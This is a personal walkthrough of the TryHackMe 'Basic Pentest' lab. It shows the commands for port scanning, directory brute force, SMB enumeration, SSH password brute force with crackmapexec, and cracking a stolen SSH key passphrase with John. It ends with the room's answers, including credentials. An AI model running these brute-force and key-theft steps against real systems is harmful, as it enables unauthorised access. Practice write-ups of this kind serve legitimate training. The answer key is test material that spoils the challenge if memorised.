Hey Hackers, 

I think it's time for me to wash the dirt off my hands by sharing the methodologies I use for compromising the CTF machines on hacking platforms like `HackTheBox`, `TryHackMe` etc. After a lot of bullshits I came back to the good old conclusion of `Sharing is Caring!`. Even though I have done much of machines before, I rarely document my art of hacking. As this is a Beginning I think it'll be better for me to start from basic easy machines to the much insane ones, 

Lets take single small steps a time.

So enough of this junk talks, let's get in to the game. Today from tons of easy machines, the lot has been fallen for the `Basic Pentest` [machine](https://tryhackme.com/r/room/basicpentestingjt) in `TryHackMe` which is a very easy one.

Let's fire up the machine first. Take some time to lit up my Hacking Skills. I'm just blabbering this craps only because this is my first writeup. I don't talk much usually. lol.

As always let's begin with a simple and quickest port scan using rustscan. You can get the rustscan from [here](heresareallystrongpasswordthatfollowsthepasswordpolicy$$).
```sh
rustscan -a 10.10.207.198 --ulimit 5000 | tee ./nmap/rust.log
<snipped>
Nmap scan report for 10.10.207.198
Host is up, received syn-ack (0.24s latency).
Scanned at 2024-08-24 01:13:22 IST for 1s

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
8009/tcp open  ajp13        syn-ack
8080/tcp open  http-proxy   syn-ack
```

I used rustscan for the quick port enumeration. It's usually time saving. We got the open ports and now let's use Nmap to footprint the open services. There are options to use Nmap along with rustscan but I just prefer the old school way.

Enumerate the service versions using Nmap on the open ports
```sh
nmap -sV 10.10.207.198 -p 22,80,139,445,8009,8080 -oN ./nmap/Service.log
<snipped>
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see from above two output results, there are 6 open ports. `SSH` is a common open port in the CTFs which is of no use normally except for login to the server if we could enumerate any credentials from other sources. or Bruteforce is the thing we got. That's the last and final option for me while I'm on a box.

So for now let's begin with the second smallest port in the order, that is `80` which is serving an `Apache httpd 2.4.18 web server`. It also hints that the host machine platform is `Ubuntu`.

Let's fire up a web browser and take a look through the server.
```sh
firefox http://10.10.207.198 &
```

Oh Damn! There is nothing much in here.
![[Attachments/Pasted image 20240824012735.png]]

Just a custom page saying it's under maintenance. Let's try inspect the source code and take a look.
![[Attachments/Pasted image 20240824012847.png]]
That looks like a hint for us, ain't it?. 

It looks like a message to someone coming here. Possibly there would be more files and directories in the server. 
So how do we know where the files are at? 

Ya, Lets Bruteforce the directories in the server using `Gobuster`.
```sh
gobuster dir -u http://10.10.207.198/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster_80.log -t 40
<snipped>
/development          (Status: 301) [Size: 320] [--> http://10.10.207.198/development/]
```
Ha, we got a redirect code `302` on directory name `/development`.

![[Attachments/Pasted image 20240824013510.png]]
There are two text files in the directory. Seems like these are the notes that hinted in the home page source code comments.

After opening the text files.
![[Attachments/Pasted image 20240824013641.png]]
![[Attachments/Pasted image 20240824013658.png]]
Reading these notes, we could understand that these two notes are chat conversations between two users `J` and `K`, and one of the guy is working on an apache struts and not yet completed, there is a SMB Server configured and running, `K` is also asking `J` to update his password and it's less secure and easily cracked.

The above files telling us there is probable chance of bruteforcing the credential in any of the logins, but till now we do not have any usernames known but only first letters of the names.

Let's go enumerate `SMB 445` as the next port as they hinted about it in the conversation files.
```sh
smbclient -N -L //10.10.207.198/  

Sharename       Type      Comment
---------       ----      -------
Anonymous       Disk      
IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
```

Enumerate the shares,
```sh
smbclient -N //10.10.207.198/anonymous 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 23:01:20 2018
  ..                                  D        0  Thu Apr 19 22:43:06 2018
  staff.txt                           N      173  Thu Apr 19 22:59:55 2018
14318640 blocks of size 1024. 11086752 blocks available
```

There is another note in the SMB share called `staff.txt`, Let's read it
```sh
smb: \> !cat staff.txt 
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it\'s all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
That's a staff announcement. But what's something valuable to us is, we got the full usernames!! `Kay and Jan`. 
We already know that the password of the user `Jan` is very weak and can be easily cracked. So let's try bruteforce the `SSH` using `hydra` or `crackmapexec`. I am using `CrackMapExec` this time.
```sh
crackmapexec ssh 10.10.207.198 -u jan -p /usr/share/wordlists/rockyou.txt 
<snipped>
SSH         10.10.207.198   22     10.10.207.198    [-] jan:loveme1 Authentication failed.                             
SSH         10.10.207.198   22     10.10.207.198    [-] jan:milagros Authentication failed.                            
SSH         10.10.207.198   22     10.10.207.198    [-] jan:stella Authentication failed.                              
SSH         10.10.207.198   22     10.10.207.198    [-] jan:lilmama Authentication failed.                             
SSH         10.10.207.198   22     10.10.207.198    [-] jan:beyonce Authentication failed.                             
SSH         10.10.207.198   22     10.10.207.198    [-] jan:lovely1 Authentication failed.                             
SSH         10.10.207.198   22     10.10.207.198    [-] jan:rocky Authentication failed.     
SSH         10.10.207.198   22     10.10.207.198    [-] jan:daddy Authentication failed.    
SSH         10.10.207.198   22     10.10.207.198    [-] jan:catdog Authentication failed.                              
SSH         10.10.207.198   22     10.10.207.198    [+] jan:armando                 
```

Success! We got the password for the user `jan:armando`.

Meanwhile I went through the other open ports `8009` and `8080` as well. Found nothing useful in there so just left it there, and by the time the credentials got cracked out from `crackmapexec`.

So, Login to the ssh server.
![[Attachments/Pasted image 20240824015826.png]]
\<snipped>
![[Attachments/Pasted image 20240824015859.png]]
After a lite enumeration we got the `ssh id_rsa` file for the user `Kay` from his user home directory and we have permission to read it.
![[Attachments/Pasted image 20240824020149.png]]

Let's try to login to the user kay using this file.
```sh
jan@basic2:/home/kay/.ssh$ ssh kay@127.0.0.1 -i id_rsa
```

![[Attachments/Pasted image 20240824020637.png]]
We are unable to login to the user as it requires passphrase for the `id_rsa` file and we don't have it.

So Let's transfer it on to our attack machine by copy paste or some other means and brute force the passphrase, Here I'm using `SCP` for transferring the files.
```sh
scp jan@10.10.207.198:/home/kay/.ssh/id_rsa ./
```
Transfer successful.

Lets try to crack it using our beloved `John`.
```sh
ssh2john id_rsa > kay_rsa.hash
john kay_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt 
john kay_rsa.hash --show  
```

![[Attachments/Pasted image 20240824021013.png]]
We cracked the passphrase for the file. now lets log in to the user `Kay` using this file.
```sh
ssh kay@10.10.207.198 -i id_rsa
```
![[Attachments/Pasted image 20240824021211.png]]

There is a `pass.bak` file in the user home directory of this user and it wasn't readable with user `Jay` but now it's readable as the file is owned by  `Kay`.
![[Attachments/Pasted image 20240824021340.png]]
We got a password in the file and it looks like its the password for `Kay:heresareallystrongpasswordthatfollowsthepasswordpolicy$$`.

Now let's check for the `sudo permission` for this user to escalate privileges to root.
```sh
sudo -l
```
![[Attachments/Pasted image 20240824021538.png]]
This user has full permission and can do anything and everything.

So let's switch and interact as root user.
```sh
sudo -i
```

![[Attachments/Pasted image 20240824021650.png]]
Ta Da !!! We broke the coconut shell. It's a final note congratulating us for this victory. Seems like a best start for me on this writeup journey and to you as well.

---
What is the name of the hidden directory on the web server(enter name without /)?
> /development

What is the username?
> jan

What is the password?
> armando

What service do you use to access the server(answer in abbreviation in all caps)?
>SSH

What is the name of the other user you found(all lower case)?
> kay

What is the final password you obtain?
> heresareallystrongpasswordthatfollowsthepasswordpolicy$$


 Congratulation! Hack Every Shells
 ~/ Unknown Coconut